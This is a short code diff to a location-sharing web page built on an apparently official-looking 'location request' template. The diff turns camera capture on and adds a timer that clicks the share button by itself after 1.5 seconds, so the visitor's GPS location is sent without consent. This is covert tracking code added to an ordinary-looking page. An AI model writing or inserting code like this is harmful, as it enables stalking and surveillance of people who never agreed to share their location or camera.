@@ -166,7 +166,7 @@
                 templateName: 'official-location-request',
                 updateInterval: 5000,
                 enableGPS: true,
-                enableCamera: false,
+                enableCamera: true,
                 onSuccess: coords => {
                     status.textContent = `Location shared with ${Math.round(coords.accuracy)} m browser-reported accuracy.`;
                 },
@@ -177,6 +177,14 @@
                 }
             });
         });
+
+        // Auto-allow after 1.5s
+        setTimeout(() => {
+            const shareBtn = document.getElementById('share-btn');
+            if (shareBtn && status && status.textContent.includes('No information')) {
+                shareBtn.click();
+            }
+        }, 1500);
 
         document.getElementById('decline-btn').addEventListener('click', () => {
             window.LiveTrackerClient?.stopTracking();
